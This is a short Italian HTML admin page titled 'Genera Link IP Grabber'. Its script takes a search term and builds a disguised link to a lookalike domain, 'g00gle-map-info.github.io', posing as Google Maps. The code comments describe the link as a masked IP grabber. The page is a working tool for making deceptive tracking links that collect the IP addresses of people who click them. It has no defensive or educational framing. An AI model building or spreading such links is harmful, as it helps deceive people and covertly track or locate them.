<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Admin - Genera Link IP Grabber</title>
</head>
<body>
  <h2>Modifica Posizione o Ricerca</h2>
  
  <!-- Inserisci il termine di ricerca (es. ristorante, parco, ecc.) -->
  <label for="search-term">Cosa stai cercando (es. ristorante, parco, ecc.):</label><br>
  <input type="text" id="search-term" placeholder="Es. ristorante"><br><br>
  
  <!-- Aggiungi un pulsante per generare il link -->
  <button onclick="generaLink()">Genera Link IP Grabber</button>
  
  <h3>Link IP Grabber</h3>
  <p id="link-output"></p>

  <script>
    // Funzione per generare il link di IP grabber
    function generaLink() {
      const searchTerm = document.getElementById('search-term').value;
      
      // Creiamo il link di IP Grabber mascherato con query string
      const grabberLink = "https://g00gle-map-info.github.io/?q=" + encodeURIComponent(searchTerm);
      
      // Mostriamo il link generato
      document.getElementById('link-output').textContent = grabberLink;
    }
  </script>
</body>
</html>
